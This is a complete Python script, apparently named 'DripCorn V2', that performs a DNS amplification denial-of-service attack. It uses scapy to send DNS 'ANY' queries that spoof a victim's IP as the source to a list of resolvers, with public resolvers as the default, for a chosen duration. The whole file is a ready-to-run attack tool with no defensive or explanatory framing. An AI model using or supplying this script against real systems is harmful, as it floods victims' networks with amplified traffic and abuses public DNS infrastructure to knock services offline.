#!/usr/bin/env python3
"""
DripCorn V2 - DNS Amplification
Requires: sudo + scapy
Usage: sudo python3 dns_amp.py <victim_ip> <dns_servers_file> <duration>
"""

import sys
import time
import random
from scapy.all import IP, UDP, DNS, DNSQR, send

def main():
    if len(sys.argv) != 4:
        print("Usage: sudo python3 dns_amp.py <victim> <dns_file> <duration>")
        sys.exit(1)
    
    victim = sys.argv[1]
    dns_file = sys.argv[2]
    duration = int(sys.argv[3])
    
    # Load DNS servers
    try:
        with open(dns_file, 'r') as f:
            dns_servers = [line.strip() for line in f if line.strip()]
    except:
        dns_servers = ['8.8.8.8', '8.8.4.4', '1.1.1.1']
    
    print(f"[+] DNS Amplification Attack")
    print(f"[+] Victim: {victim}")
    print(f"[+] DNS servers: {len(dns_servers)}")
    print(f"[+] Duration: {duration}s")
    
    sent = 0
    start_time = time.time()
    end_time = start_time + duration
    
    domains = [
        'example.com', 'google.com', 'facebook.com',
        'amazon.com', 'microsoft.com', 'apple.com'
    ]
    
    while time.time() < end_time:
        dns_server = random.choice(dns_servers)
        domain = random.choice(domains)
        
        # Spoof victim IP as source
        ip = IP(src=victim, dst=dns_server)
        udp = UDP(sport=random.randint(1024, 65535), dport=53)
        
        # Query for ANY record (amplification)
        dns = DNS(rd=1, qd=DNSQR(qname=domain, qtype='ANY'))
        
        packet = ip/udp/dns
        send(packet, verbose=0)
        sent += 1
        
        if sent % 100 == 0:
            print(f"[{time.strftime('%H:%M:%S')}] Queries: {sent}")
        
        time.sleep(0.01)
    
    print(f"\n[+] Attack complete")
    print(f"[+] Total queries: {sent}")
    print(f"[+] Amplification sent to victim")

if __name__ == '__main__':
    main()
